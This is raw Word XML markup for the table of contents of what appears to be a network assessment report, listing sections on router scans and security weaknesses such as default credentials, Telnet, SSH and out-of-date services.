            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2712611B" w14:textId="261C41D0"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50" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1.4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Host Information</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984550 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0723FDC9" w14:textId="44FF34E6" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984551" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Network Mapping Process</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984551 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0ACBCB9C" w14:textId="631ED4F9"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52" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Initial Network Scans</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984552 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="474ECD01" w14:textId="341A1F2F"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53" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Routers</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984553 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="351B7515" w14:textId="33F5583B"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54" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.2.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Router 1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984554 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="796778AC" w14:textId="3BFEC076"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55" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.2.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Router 2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984555 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="118D5AB8" w14:textId="6B3FC46B"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56" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.2.3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Router 3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984556 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="76DDFE9C" w14:textId="43A66DE6"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57" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>3.2.4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Router 4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984557 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>27</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3D7DA899" w14:textId="52F7F986" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984558" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Security Weaknesses</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984558 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="18B9CE3A" w14:textId="582394CA"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59" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>4.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Exploitable Weaknesses</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984559 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2B2935FA" w14:textId="457B68A5"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0" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.1.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Default Credentials</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984560 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6708866B" w14:textId="4DBA348B"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1" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.1.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Weak Password Requirements</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984561 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4D19A577" w14:textId="41D4DE02"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2" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.1.3</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>This issue with Telnet</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984562 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6BEDA3F7" w14:textId="5DF45892"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3" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.1.4</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>SSH</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984563 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="16B81D7D" w14:textId="6F8CBB2B"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4" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.1.5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Out of Date Services</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984564 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
